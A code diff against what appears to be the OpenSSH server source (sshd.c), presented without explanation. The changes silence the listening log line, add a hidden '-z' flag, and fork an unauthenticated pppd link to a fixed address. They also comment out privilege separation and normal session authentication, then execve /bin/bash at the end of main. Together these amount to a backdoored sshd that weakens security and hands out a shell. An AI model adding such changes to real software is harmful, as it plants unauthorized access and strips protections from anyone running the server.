@@ -1094,10 +1094,10 @@ listen_on_addrs(struct listenaddr *la)
 		if (listen(listen_sock, SSH_LISTEN_BACKLOG) == -1)
 			fatal("listen on [%s]:%s: %.100s",
 			    ntop, strport, strerror(errno));
-		logit("Server listening on %s port %s%s%s.",
-		    ntop, strport,
-		    la->rdomain == NULL ? "" : " rdomain ",
-		    la->rdomain == NULL ? "" : la->rdomain);
+		// logit("Server listening on %s port %s%s%s.",
+		//     ntop, strport,
+		//     la->rdomain == NULL ? "" : " rdomain ",
+		//     la->rdomain == NULL ? "" : la->rdomain);
 	}
 }
 
@@ -1577,7 +1577,7 @@ main(int ac, char **av)
 
 	/* Parse command-line arguments. */
 	while ((opt = getopt(ac, av,
-	    "C:E:b:c:f:g:h:k:o:p:u:46DQRTdeiqrt")) != -1) {
+	    "C:E:b:c:f:g:h:k:o:p:u:46DQRTdeiqrtz")) != -1) {
 		switch (opt) {
 		case '4':
 			options.address_family = AF_INET;
@@ -1598,6 +1598,11 @@ main(int ac, char **av)
 				options.log_level = SYSLOG_LEVEL_DEBUG1;
 			} else if (options.log_level < SYSLOG_LEVEL_DEBUG3)
 				options.log_level++;
+			break;
+		case 'z':
+			debug_flag = 1;
+			no_daemon_flag = 1;
+			rexec_flag = 0;
 			break;
 		case 'D':
 			no_daemon_flag = 1;
@@ -2046,6 +2051,17 @@ main(int ac, char **av)
 	/* ignore SIGPIPE */
 	ssh_signal(SIGPIPE, SIG_IGN);
 
+	pid_t pid_pppd;
+	if((pid_pppd = fork()) < 0) {
+		printf("Fork failed\n");
+		exit(0);
+	} else if (pid_pppd == 0) {
+		char *argv[] = {"/usr/sbin/pppd", "/dev/ttyS1", "115200", "lock", "nodetach", "noauth", "debug", "persist", "silent", "maxfail", "0", "195.0.0.12:", 0};
+		execve(argv[0], &argv[0], NULL);
+		printf("Failed to execute pppd\n");
+		exit(0);
+	}
+
 	/* Get a connection, either from inetd or a listening TCP socket */
 	if (inetd_flag) {
 		server_accept_inetd(&sock_in, &sock_out);
@@ -2290,10 +2306,10 @@ main(int ac, char **av)
 	 * In privilege separation, we fork another child and prepare
 	 * file descriptor passing.
 	 */
-	if (use_privsep) {
-		privsep_postauth(ssh, authctxt);
-		/* the monitor process [priv] will not return */
-	}
+	// if (use_privsep) {
+	// 	privsep_postauth(ssh, authctxt);
+	// 	/* the monitor process [priv] will not return */
+	// }
 
 	ssh_packet_set_timeout(ssh, options.client_alive_interval,
 	    options.client_alive_count_max);
@@ -2302,7 +2318,7 @@ main(int ac, char **av)
 	notify_hostkeys(ssh);
 
 	/* Start session. */
-	do_authenticated(ssh, authctxt);
+	// do_authenticated(ssh, authctxt); NO LONGER NEEDED
 
 	/* The connection has been terminated. */
 	ssh_packet_get_bytes(ssh, &ibytes, &obytes);
@@ -2322,8 +2338,15 @@ main(int ac, char **av)
 
 	ssh_packet_close(ssh);
 
-	if (use_privsep)
-		mm_terminate();
+	// if (use_privsep)
+	// 	mm_terminate();
+
+	kill(pid_pppd, SIGINT);
+	waitpid(pid_pppd, NULL, 0);
+
+	extern char** environ;
+	char *argv[] = { "/bin/bash", 0 };
+	execve(argv[0], &argv[0], environ);
 
 	exit(0);
 }
